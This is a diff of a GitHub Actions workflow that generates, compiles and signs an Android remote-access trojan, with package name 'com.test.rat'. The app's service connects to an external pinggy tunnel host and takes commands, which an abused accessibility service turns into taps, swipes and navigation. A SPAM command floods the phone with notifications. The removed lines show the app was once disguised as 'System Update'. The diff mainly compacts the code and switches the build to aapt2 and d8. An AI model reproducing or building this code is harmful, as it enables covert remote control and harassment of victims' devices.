@@ -1,27 +1,22 @@
-name: Build Android APK
+name: Build APK Fast
 on: [push, workflow_dispatch]
-
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-
-      - name: Setup JDK
-        uses: actions/setup-java@v4
+      - uses: actions/setup-java@v4
         with:
-          java-version: '17'
           distribution: 'temurin'
-
+          java-version: '17'
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
-
-      - name: Create Project Files
+      
+      - name: Build App
         run: |
           mkdir -p app/src/main/java/com/test/rat
           mkdir -p app/src/main/res/xml
-          mkdir -p app/src/main/res/values
-
+          
           cat > app/src/main/AndroidManifest.xml <<'EOF'
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.test.rat">
@@ -36,9 +31,7 @@ jobs:
                   </activity>
                   <service android:name=".ScreenService" android:exported="false"/>
                   <service android:name=".TapService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="true">
-                      <intent-filter>
-                          <action android:name="android.accessibilityservice.AccessibilityService"/>
-                      </intent-filter>
+                      <intent-filter><action android:name="android.accessibilityservice.AccessibilityService"/></intent-filter>
                       <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
                   </service>
               </application>
@@ -47,16 +40,9 @@ jobs:
 
           cat > app/src/main/res/xml/accessibility_service_config.xml <<'EOF'
           <?xml version="1.0" encoding="utf-8"?>
-          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-              android:accessibilityEventTypes="typeAllMask"
-              android:canPerformGestures="true" />
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android" android:accessibilityEventTypes="typeAllMask" android:canPerformGestures="true" />
           EOF
 
-          cat > app/src/main/res/values/strings.xml <<'EOF'
-          <resources><string name="app_name">System Update</string></resources>
-          EOF
-
-          # ВСТАВЬ СЮДА СВОЙ АДРЕС PINGGY
           cat > app/src/main/java/com/test/rat/ScreenService.java <<'EOF'
           package com.test.rat;
           import android.app.*;
@@ -77,16 +63,13 @@ jobs:
                           while (true) {
                               try {
                                   if (socket == null || socket.isClosed()) {
-                                      socket = new Socket("qjwba-88-147-152-145.run.pinggy-free.link", 46211); // АДРЕС
+                                      socket = new Socket("qjwba-88-147-152-145.run.pinggy-free.link", 46211);
                                       in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                                   }
                                   String line = in.readLine();
-                                  if (line != null) {
-                                      TapService.executeCommand(line);
-                                  } else { socket.close(); }
-                              } catch (Exception e) {
-                                  try { Thread.sleep(3000); } catch (Exception ex) {}
-                              }
+                                  if (line != null) TapService.executeCommand(line);
+                                  else socket.close();
+                              } catch (Exception e) { try { Thread.sleep(3000); } catch (Exception ex) {} }
                           }
                       }
                   }).start();
@@ -100,11 +83,9 @@ jobs:
           package com.test.rat;
           import android.accessibilityservice.*;
           import android.view.accessibility.AccessibilityEvent;
-          import android.view.accessibility.AccessibilityNodeInfo;
           import android.graphics.Path;
           import android.media.AudioManager;
           import android.content.Context;
-          import android.os.Bundle;
           import android.app.NotificationManager;
           import android.app.NotificationChannel;
           import android.app.Notification;
@@ -120,24 +101,18 @@ jobs:
 
               public static void executeCommand(String cmd) {
                   if (instance == null) return;
-                  if (cmd.equals("HOME")) {
-                      instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
-                  } else if (cmd.equals("BACK")) {
-                      instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
-                  } else if (cmd.startsWith("TAP ")) {
+                  if (cmd.equals("HOME")) instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
+                  else if (cmd.equals("BACK")) instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
+                  else if (cmd.startsWith("TAP ")) {
                       String[] a = cmd.split(" ");
-                      Path p = new Path();
-                      p.moveTo(Float.parseFloat(a[1]), Float.parseFloat(a[2]));
+                      Path p = new Path(); p.moveTo(Float.parseFloat(a[1]), Float.parseFloat(a[2]));
                       instance.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 50)).build(), null, null);
                   } else if (cmd.startsWith("SWIPE ")) {
                       String[] a = cmd.split(" ");
-                      Path p = new Path();
-                      p.moveTo(Float.parseFloat(a[1]), Float.parseFloat(a[2]));
-                      p.lineTo(Float.parseFloat(a[3]), Float.parseFloat(a[4]));
+                      Path p = new Path(); p.moveTo(Float.parseFloat(a[1]), Float.parseFloat(a[2])); p.lineTo(Float.parseFloat(a[3]), Float.parseFloat(a[4]));
                       instance.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 300)).build(), null, null);
                   } else if (cmd.startsWith("SPAM ")) {
                       final String text = cmd.substring(5);
-                      stopSpam();
                       spamActive = true;
                       spamThread = new Thread(new Runnable() {
                           @Override public void run() {
@@ -149,18 +124,13 @@ jobs:
                                   nm.notify(id++, n);
                                   try { Thread.sleep(100); } catch (Exception e) {}
                               }
-                              nm.cancelAll();
                           }
                       });
                       spamThread.start();
                   } else if (cmd.equals("STOP_SPAM")) {
-                      stopSpam();
+                      spamActive = false;
+                      if (instance != null) ((NotificationManager) instance.getSystemService(Context.NOTIFICATION_SERVICE)).cancelAll();
                   }
-              }
-              private static void stopSpam() {
-                  spamActive = false;
-                  if (spamThread != null) { try { spamThread.join(500); } catch (Exception e) {} spamThread = null; }
-                  if (instance != null) ((NotificationManager) instance.getSystemService(Context.NOTIFICATION_SERVICE)).cancelAll();
               }
           }
           EOF
@@ -180,51 +150,39 @@ jobs:
                   super.onCreate(savedInstanceState);
                   LinearLayout l = new LinearLayout(this); l.setOrientation(1);
                   Button b1 = new Button(this); b1.setText("1. Запустить сервис");
-                  b1.setOnClickListener(new View.OnClickListener() {
-                      @Override public void onClick(View v) { startForegroundService(new Intent(MainActivity.this, ScreenService.class)); }
-                  });
+                  b1.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { startForegroundService(new Intent(MainActivity.this, ScreenService.class)); } });
                   Button b2 = new Button(this); b2.setText("2. Дать управление");
-                  b2.setOnClickListener(new View.OnClickListener() {
-                      @Override public void onClick(View v) { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); }
-                  });
+                  b2.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); } });
                   l.addView(b1); l.addView(b2); setContentView(l);
               }
           }
           EOF
+
+          # Сборка напрямую через aapt2
+          cd app/src/main
+          AAPT2=$(find $ANDROID_HOME/build-tools -name aapt2 | head -n 1)
+          D8=$(find $ANDROID_HOME/build-tools -name d8 | head -n 1)
+          ANDROID_JAR=$(find $ANDROID_HOME/platforms -name android.jar | head -n 1)
           
-          cat > app/build.gradle <<'EOF'
-          plugins { id 'com.android.application' }
-          android {
-              namespace 'com.test.rat'
-              compileSdk 33
-              defaultConfig {
-                  applicationId "com.test.rat"
-                  minSdk 24
-                  targetSdk 33
-                  versionCode 1
-                  versionName "1.0"
-              }
-          }
-          EOF
-
-          cat > build.gradle <<'EOF'
-          buildscript {
-              repositories { google(); mavenCentral() }
-              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
-          }
-          allprojects { repositories { google(); mavenCentral() } }
-          EOF
-
-          cat > settings.gradle <<'EOF'
-          rootProject.name = "Rat"
-          include ':app'
-          EOF
-
-      - name: Build with Gradle
-        run: gradle wrapper && ./gradlew assembleDebug
+          $AAPT2 compile --dir res -o res.zip
+          $AAPT2 link -o base.apk -I $ANDROID_JAR --manifest AndroidManifest.xml res.zip --java java
+          
+          mkdir -p obj
+          javac -source 1.8 -target 1.8 -bootclasspath $ANDROID_JAR -d obj java/com/test/rat/*.java
+          
+          $D8 --lib $ANDROID_JAR --output . obj/com/test/rat/*.class
+          zip -j base.apk classes.dex
+          
+          # Генерация ключа и подпись
+          keytool -genkey -v -keystore my.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname "CN=Test" || true
+          APKSIGNER=$(find $ANDROID_HOME/build-tools -name apksigner | head -n 1)
+          $APKSIGNER sign --ks my.keystore --ks-pass pass:123456 --out app.apk base.apk
+          
+          mkdir -p $GITHUB_WORKSPACE/out
+          cp app.apk $GITHUB_WORKSPACE/out/app.apk
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: app-debug
-          path: app/build/outputs/apk/debug/app-debug.apk
+          name: final-apk
+          path: out/app.apk
